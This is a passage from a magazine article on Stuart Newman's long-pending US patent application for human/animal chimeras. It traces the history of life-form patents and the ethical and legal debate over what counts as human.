News of the meeting , immediately reported in Nature , threw
the Patent Office into an even deeper bind .
“ This goes way beyond the jurisdiction of the agency , ”
Deputy Commissioner Stephen Kunin said .
“ We ’re being dragged into a controversy which , from our
perspective , we do n’t need to be part of . ”
In truth , the Patent Office made itself part of this controversy almost
two decades ago when it began granting patents for genetically altered mammals .
At that moment ,
it placed itself and the patent process at the intersection of science , commerce , and religion ,
and in Stuart Newman ’s line of fire .
THE PATENT ACT OF 1793 , drafted by Thomas Jefferson , and subsequent
case law stipulated that nature , in any of its forms or manifestations , could not be patented .
But
in the late 1920s , research agronomists approached Congress and argued that man-made plant hybrids
were not really products of nature , but rather existed as a consequence of human manipulation and
were thus , in Jefferson ’s carefully chosen words , “ a new composition of matter . ”
The 1930 Plant
Patent
Act soon allowed for new varieties of plants that reproduced asexually to be patented .
Molecular biology soon produced other techniques for creating new
organisms and genetically altering existing ones .
But most required sexual reproduction and
were thus deemed “ natural . ”
Then on June 16 , 1980 , the U.S. Supreme Court surprised both sides in
an obscure patent case by ruling 5 - to - 4 that a General Electric scientist named Ananda Chakrabarty
could patent genetically modi-fied bacteria that produced enzymes capable of breaking down crude
oil .
In its opinion , the majority concluded that Chakrabarty ’s bugs , with their vibrant cells
and shimmering DNA , were “ a human - made invention … with markedly different characteristics
from any found in nature . ”
They were new compositions of matter , and were , for the life of the patent ,
the sole property of General Electric , which , fearful of releasing such an engineered life - form
into the environment , never used them .
Soon , thousands of life - form patent applications were before the Patent
Office , which rapidly evolved from an agency opposed to patenting life - forms to an outright booster
of the practice .
Biotech scientists , executives , and their attorneys surmised that if whole organisms
were now patentable , then surely inert pieces of them — genes and gene sequences — would
be as well .
A 1986 patent for corn genetically manipulated to produce
tryptophan — the
chemical the human body uses to make serotonin— widened the opening .
In 1987 , the Patent
Board of Appeals rejected a process to produce bigger oysters through pressure as “ too obvious ”
but noted that involvement of a multicellular animal was not itself a bar to patentability .
On the
strength of that decision , Patent Commissioner Donald Quigg called a press conference and announced
that all “ multicellular living organisms , including animals , ” were patentable .
He did make a
specific exception for human beings , a restriction mandated , Quigg said , by the 13th Amendment ,
which prohibits their ownership .
Few realized how much wider the Quigg decision had opened the pathway
to life - form patenting until a year later , when after a five - year court battle , the Patent Office
issued Patent No. 4,736,866 to Harvard biologists Philip Leder and Timothy Stewart for mice transgenically
engineered to develop tumors .
The famous OncoMouse® was born , and DuPont , which
funded the research , holds the exclusive license to it and all its progeny , though the National
Institutes of Health is using the mice for cancer research with the understanding that any commercial
application it develops belongs to DuPont .
The OncoMouse® was the first complete , living , breathing
mammal to be patented in the United States , but it was not the last .
Scores of transgenic mammalian
patents have since been approved , including those for cows and sheep modified to produce medicinal
milk ( “ factory pharming ” ) , rats with a propensity to develop in - flammatory diseases , and a mouse
whose cells contain the gene for human insulin .
When Newman filed in 1997 , his was among 15,000 biotech
patents applied for that year .
By 2002 the number had nearly doubled .
Most are approved , many of
them conflicting with existing patents , leaving previous owners no recourse but the courts , which
thrills patent attorneys .
And , despite Quigg ’s 13th Amendment stipulation , applications to
patent human genes also increase , even genes for which there is no known purpose or product .
And
they are approved .
When objections are raised to this practice , particularly by scientists , the
Biotech Industry Organization argues that the United States would lose its “ global competitive
advantage ” if a patent slipped away .
“ Few people realize , ” one newspaper article notes , “ that
a genetic ‘ land grab ’ is taking place on a scale that rivals 19th - century colonialism . ”
IF NEWMAN ’S PATENT seems the stuff of fancy or Planet of the
Apes ,
consider that a sheep / goat chimera was made back in 1984 .
It ’s called a “ geep . ”
When fully grown ,
it looks a little like a sheep with features of a goat , or vice versa , and the cells of each are fairly
evenly scattered throughout the geep .
In a chimera , the two sets of cells remain distinct ( unlike
in a hybrid such as a mule , where all the cells are hybridized “ mule cells ” ) , ensuring that a geep
will accept skin grafts from either the sheep or the goat whose cells it owns without stimulating
an immune response .
And it can be used to test the toxic effects of chemicals on both sheep and goats .
Thus a part - human chimera , even one without obvious human characteristics or rights , could be
used to test for human carcinogens and mutagens without the safeguards currently required for
clinical trials .
In his application , Newman says “ the cells composing the embryo may
contain one or more transgenes . ”
With such a refinement , chimeric technology could one day be used
to engineer specific
tissue characteristics of one species into the organs of another .
That would be the first step toward growing transplantable human organs inside other animals ,
a product of enormous commercial interest to biotech companies like Advanced Cell Technology
( ACT ) , which looks on with envy and distress as Newman does battle with the government .
A Boston - area company , ACT is already inserting human DNA into cow embryos
to produce and patent human stem cells .
It is also attempting to design and breed pigs that will look ,
smell , and behave like pigs in a feedlot but possess hearts , livers , kidneys , and pancreases so
humanlike in size , shape , function , and tissue type that people will not reject them after transplantation .
Either way the Patent Office rules on Newman ’s application is bad news
for ACT .
Approval means Newman owns the technology they need to advance their chimeric research ,
and ACT executives know that such an activist is unlikely to license it to them or anyone else .
Rejection
by the Patent Office sends a chilling signal through the entire biotech industry that the government
has found a moral boundary beyond which it is unwilling to tread .
This may explain why ACT ’s high - profile vice president of scientific
and medical development , Robert Lanza , told me that he
supports Newman ’s effort “ 100 percent ”
but added , “ While I am opposed to creating chimeric animals , I do not approve of tying up any technology
that could save lives . ”
ALTHOUGH IT IS NOW THE EXPLICIT GOAL of the Patent Office to complete
patent reviews within 24 months , Newman ’s patent is still officially pending , six years after
it was filed .
On four occasions patent inspectors have rejected his application , but with objections
so vague and specious that Newman and his attorneys have been able to argue it back to life , only to
be rejected again on new grounds .
When the agency objected to using human embryonic cells to help
create a chimera , for example , Newman ’s lawyers pointed out it is legal to abort 100 - percent - human
embryos , and would make no sense to grant part - human embryos greater protection .
But one objection survives each exchange — that the chimera itself
would be too humanesque .
All the recipes in Dr. Newman ’s application call for using human embryonic
cells and stem cells , and describe methods likely to raise the ire of anyone who believes that human
life begins at conception or that human cells are more sacred than those of other creatures .
Newman’s
chimera could end up looking , feeling , and behaving somewhat like a human being .
That so troubled
patent inspector Deborah Crouch , the first of four
examiners to work the case , that she coined
an intriguing expression to justify rejection .
“ Since applicant ’s claimed invention embraces
a human being , ” she wrote , “ it is not considered to be patentable subject matter . ”
Newman and the
Patent Office have spent much of the subsequent six years grappling with the meanings of “ embrace ”
and “ human . ”
To make matters more bizarre , while Newman and his lawyers argue against
the embraces - a- human assessment , Newman in fact agrees with it .
He knows at least four ways to make
a chimera , but he has no intention of ever making one , with or without human cells and features .
So
as not to disseminate technology he considers dangerous , his application includes only techniques
to make chimeras that can be found in existing literature , which gave examiners another excuse
to reject his patent — lack of originality .
Newman responded that it is not the method for
which he seeks a patent but the “ unique application ” of using human cells and , of course , the final
product .
What that product would be , exactly , is at least as much the stuff of philosophy
as science .
Place a human gene or gene sequence in a pig or dog and you have n’t really moved either
animal very close to being human as we understand it .
But place the same genes in a chimpanzee , whose
DNA is so similar to a human ’s that only a full genomic scan can tell them apart , and you could create
something almost human , something that perhaps begins to resemble or “ embrace ” a human .
This would
be even more likely if you made a new creature by combining embryonic cells , rather than just the
genes , from two or more species , as in Newman ’s chimera .
“ Different people would draw the line between
nonhuman and human at different places , ” says Newman .
“ The problem is , the material continuity
among all living organisms is such that no matter where you choose to draw it , based on whatever philosophy
and belief system , the technology will eventually enable crossing that line . ”
Pull back from the molecular level and the answer to the question “ What
is human ? ” is fairly obvious .
Bruce Lehman echoed Justice Potter Stewart ’s famous definition
of obscenity when asked what he thought would constitute a chimeric human .
“ I ’m quite certain that
when we see one of these , we ’ll know it , ” he told the Washington Post a few weeks after issuing his
summary rejection in 1998 .
But with a chimera ’s ability to hide distinct human features , even intelligence ,
inside another species , the definition of humanity could be blurred beyond recognition .
Now that he ’s stepped down from the Patent Office , Bruce Lehman can talk
about pending patents , and so in August 2002
we met a few blocks from the U.S. Capitol in his
modest office at the International Intellectual Property Institute , an organization he created
after leaving office with a $ 1 million grant from the Bush administration .
IIPI promotes the installation
of patenting systems
in every country of the world .
As a private citizen , Lehman is free
to
reveal his true motivations for stifling Newman ’s patent , and
as a patent evangelist he’s
happy to expound on the vital role
intellectual - property laws play in industrial development ,
eco -
nomic globalization , and the commercialization of biotech inventions .
And he is more
than willing to rebuke bio-Luddites such as Newman , whom he regards as anti-science .
“ Stuart Newman is promoting an effort that will make it difficult to
engage in biological research and commercialize the fruits of that research , ” says Lehman .
“ It ’s
not funny or cute ; it is profoundly wrong .
Every attempt to stop science has been characterized
by darkness . ”
Lehman says he was acting on the concept of ordre public , a European legal
restriction against immoral inventions that does not exist in American patent law .
Nevertheless ,
he believes that every American public official should be responsible for defending
ordre
public whether or not it is required by statute .
Yet Lehman also told me that had Advanced Cell Technology , Geron Corp . ,
or almost any biotech firm applied for the same patent Newman did , he would not have stood in their
way .
And though he spoke of “ monsters ” when he first reacted to Newman ’s patent , Lehman now says
he does “ not believe there should be a prohibition against a human patent . ”
It was not the specter
of half - human chimeras or even patenting whole human beings that revolted him , he now says .
“ I was
just deeply offended by anyone attempting to use the U.S. Patent Office to make a point , or to stop
the advancement of science .
I refused to make it easy for him . ”
Whatever his motives , by violating the agency ’s rules and issuing a
premature and emotional ruling , Lehman may have given Newman adequate justification to appeal
a rejection .
By law , inventors are entitled to revise their applications and reapply as often as
they wish in pursuit of approval .
But Newman and his lawyers have decided that if the agency persists
in rejecting the invention , they will appeal the decision all the way to the Supreme Court .
NEWMAN AND HIS ATTORNEYS have had only one audience with patent examiners .
The “ interview ” occurred in January 2001 , when the case was transferred to a new examiner .
“ They
really did n’t know what to make of us , ” recalls his attorney at the time , Patrick Coyne , who says
they talked through the “ embracing ” issue and tried to explain to the new examiner why the invention
was “ original . ”
For the moment , Patent officials seem content to leave Newman ’s application
in limbo while they strategize their next move .
They ’re faced with four options :
They can withdraw
all their objections and grant a patent ; they can withdraw legal and scientific objections and
reject the invention because it “ embraces a human ” ; they could drop the embraces - a- human complaint
and reject the patent for lack of originality or utility ; or they could stand their ground on all
objections and let the courts decide .
There are vexing questions at work here , both moral and legal .
Should
new organisms be created ?
Should any organisms be patented ?
And should humans or anything remotely
resembling humans be created or patented ?
While it is really only the business of the Patent Office
to deal with the second question , Newman ’s initiative could eventually force the entire federal
government — executive , legislative , and judicial branches — to consider the others .
In their third response to Newman , sent in August 2000 , patent officials
acknowledged , “ In the absence of clear legislative intent and guidance from the courts , it is incumbent
on the Office to proceed cautiously . ”
That is tantamount , contends attorney Coyne , to admitting
that the agency has been granting
life - form patents for more than 20 years without congressional
authority .
Newman hopes this means that Congress and the courts may soon be forced to reconsider
the entire patent law , which was last rewritten in the early 1950s , long before the biotech era began .
“ They ’re asking themselves how far they can go , ” Newman says .
“ They
seem set upon turning down the application as an act of prudence and letting me take it to the Board
of Patent Appeals and beyond . ”
Patent Appeals is an interagency court where inventors and patent
examiners can haggle before administrative judges over what is or is not feasible , novel , and useful
about an invention .
But in this case , it is also a place to decide whether to grant a handful of biotech
companies control over the genetic blueprint of evolution and open the larger debate over what
is and is not human .
For while Con- gress and the courts have made clear that
humans are not
patentable , they ’ve never defined the term “ human . ”
It ’s hard to gainsay any legal mind , especially on the current Supreme
Court , but if the court does eventually hear the case , some arguments and counterarguments can
be anticipated .
One justice might argue , for example , that chimeric mice possessing
human
brain cells are still mice , much as
the Patent Office decided that the Onco - Mouse® ,
with its array of human genes , was
a mouse — period .
Bring a cage full of the brainy little
squeakers before any court and the point will be obvious .
They ’re rodents .
However , another justice would surely observe that if human cells become
scattered throughout the entire body of a gorilla , a primate that is genetically 98 percent human ,
and the chimera looks pretty much like a gorilla , but with some obvious human traits — blue
eyes , for example , or a more functional opposing thumb — perhaps the inventor has created
something that resembles , approaches , or , in the awkward language of an ambivalent patent examiner ,
“ embraces ” a human being .
And if the
gorilla grows up with an ability to use its
larynx ,
tongue , and lips well enough to articulate a few simple words , “ I love you , ” for
example ,
one might even grant the invention personhood .
Partly in anticipation of human / animal chimeras , legal scholars and
bioethicists have already begun to challenge the strictly human view of personhood .
“ Personhood
does n’t come from coded sequences , ” asserts University of Pennsylvania bioethicist Arthur Caplan ,
“ nor does it require human anatomy .
It ’s really defined by what goes on in a brain .
A dolphin , for
example , could conceivably acquire enough additional intelligence to warrant personhood . ”
What , then , for “ human rights ” ?
And what rights are left for , say , humans
in persistent vegetative states who Caplan and a growing number of his peers say might one day be
considered to have lost their personhood and thereby their right to life ?
Save the dolphin with
its humanesque reasoning and kill the vegetative patients by harvesting their
organs for
sick humans , or even for a part -
human chimera ?
But the real issue here is not with chimps , dolphins , mice , or any of their
rights to personhood , but with our notion of humanity and how it is challenged by chimeras , which
threaten either to erase taboos we still embrace , like bestiality , or reintroduce practices we ’d
hopefully sloughed off , like slavery .
Could one animal cell make a being suitable for ownership ,
forced labor , and medical experimentation , just as “ one drop ” of black blood once did ?
What becomes of human empathy if there are chimeric , quasi- human “ flesh
robots ”
performing human tasks , or if there are two , three , four , or more genetically separate
hom - inid species of self - conscious , intelligent , soulful beings on the planet , perhaps one
being
genetically enhanced to be stronger , faster , brighter than today ’s humans , with enough chromosomal
conflicts to prevent crossbreeding with “ lesser ” humans ?
Will genetically enhanced humans lay claim to the Bill of Rights and
exclude all others , or write their own Bill of Superhuman Rights ?
Will they regard the gene poor
much as many European whites once
regarded dark - skinned humans — as lesser , subhuman
or nonhuman ?
And will the gene poor , the “ naturals , ” be forced by fate , law , or judicial decree to
accept their genetic lot in life ?
And who will parent the chimeras ?
These are questions that Stuart Newman believes must be answered before
a patent is considered for a human / primate chimera , and before a future court is forced by chimeric
technology to determine the legal status of pigs with brains powerful enough to render them self - conscious .
So he continues to fight for approval to devise creatures he hopes are never made .
